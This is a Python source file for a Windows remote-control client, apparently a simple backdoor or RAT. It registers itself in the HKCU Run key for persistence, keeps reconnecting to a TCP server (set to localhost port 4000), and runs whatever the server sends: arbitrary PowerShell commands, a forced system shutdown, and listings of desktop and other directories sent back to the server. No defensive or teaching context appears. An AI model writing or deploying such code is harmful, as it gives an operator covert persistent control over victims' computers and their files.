import socket
import time
import sys
import os
import winreg as reg


def add_to_startup():
    pth = os.path.realpath(sys.argv[0])
    key = reg.HKEY_CURRENT_USER
    key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(open_key, "PythonClientNode", 0, reg.REG_SZ, f'"{sys.executable}" "{pth}"')
        reg.CloseKey(open_key)
        print("[+] Добавлено в автозагрузку")
    except Exception as e:
        print(f"[-] Не удалось добавить в автозагрузку: {e}")


def start_client():
    server_ip = '127.0.0.1'
    port = 4000

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server_ip, port))
            print(f"[!] Подключено к серверу {server_ip}. Статус: Online")

            while True:
                try:
                    s.settimeout(None)
                    data = s.recv(1024).decode('utf-8')

                    if not data:
                        break

                    if data == "SHUTDOWN":
                        os.system("shutdown /s /t 1")
                    elif data.startswith("PS_EXEC:"):
                        ps_command = data[8:]
                        os.system(f'start powershell.exe -NoExit -Command "{ps_command}"')
                    elif data == "POWERSHELL":
                        import subprocess
                        subprocess.Popen(["powershell.exe"], creationflags=subprocess.CREATE_NEW_CONSOLE)
                        os.system("start powershell.exe")
                    elif data == "GET_DESKTOP":
                        desktop_path = os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop')
                        if os.path.exists(desktop_path):
                            files = os.listdir(desktop_path)
                            result = "\n".join(files) if files else "Рабочий стол пуст"
                        else:
                            result = "Папка рабочего стола не найдена"

                        s.send(f"DESKTOP_FILES:{result}".encode('utf-8'))

                    elif data.startswith("LIST_DIR:"):
                        path = data[9:]
                        if not path:
                            path = os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop')

                        try:
                            if os.path.exists(path):
                                items = os.listdir(path)
                                formatted_list = []
                                for item in items:
                                    full_p = os.path.join(path, item)
                                    prefix = "[DIR] " if os.path.isdir(full_p) else "[FILE] "
                                    formatted_list.append(prefix + item)

                                result = "|".join(formatted_list)
                                response = f"DIR_DATA:{path}||{result}"
                            else:
                                response = "ERROR:Path not found"
                        except Exception as e:
                            response = f"ERROR:{str(e)}"

                        s.send(response.encode('utf-8'))

                    else:
                        print(f"Получена команда: {data}")
                except Exception as e:
                    print(f"Ошибка при получении данных: {e}")
                    break

            while True:
                time.sleep(10)
                s.send(b"ping")

        except (ConnectionRefusedError, socket.error):
            print("[-] Сервер не найден. Повтор через 5 секунд...")
            time.sleep(5)
        finally:
            s.close()


if __name__ == "__main__":
    add_to_startup()
    start_client()